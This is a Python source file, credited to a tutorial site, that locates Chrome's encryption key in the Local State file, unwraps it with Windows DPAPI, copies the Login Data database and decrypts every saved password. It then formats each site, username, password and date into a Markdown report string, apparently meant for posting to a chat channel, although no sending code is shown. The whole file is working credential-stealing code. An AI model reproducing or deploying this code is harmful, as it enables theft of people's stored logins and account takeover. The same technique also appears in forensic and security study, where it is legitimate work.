# Credit: https://www.thepythoncode.com/article/extract-chrome-passwords-python

import os, win32crypt
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from sqlite3 import connect
from shutil import copyfile
from urllib.parse import urlparse
from json import loads
from base64 import b64decode


def get_domain(url):
    return urlparse(url).netloc


def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)


def get_encryption_key():
    local_state_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "Local State",
    )
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = f.read()
        local_state = loads(local_state)

    key = b64decode(local_state["os_crypt"]["encrypted_key"])
    key = key[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]


def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""


def get_chrome():
    key = get_encryption_key()
    db_path = os.path.join(
        os.environ["USERPROFILE"],
        "AppData",
        "Local",
        "Google",
        "Chrome",
        "User Data",
        "default",
        "Login Data",
    )
    filename = "ChromeData.db"
    copyfile(db_path, filename)
    db = connect(filename)
    cursor = db.cursor()
    cursor.execute(
        "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created"
    )

    chromeDB = ""

    for row in cursor.fetchall():
        username = row[2]
        password = decrypt_password(row[3], key)
        date_created = row[4]
        date_last_used = row[5]
        if not password:
            password = "---"
        elif not username:
            username = "---"
        elif username or password:
            if date_created != 86400000000 and date_created:
                creation_date = str(get_chrome_datetime(date_created))
            if date_last_used != 86400000000 and date_last_used:
                last_used = str(get_chrome_datetime(date_last_used))
            chromeDB += f"[{get_domain(row[0])}]({row[0]})\n**Username:** `{username}`\n**Password:** `{password}`\n**Creation Date:** `{creation_date}`\n**Last Used:** `{last_used}`\n------------------\n"
        else:
            continue

    cursor.close()
    db.close()
    try:
        os.remove(filename)
    except:
        pass

    return chromeDB
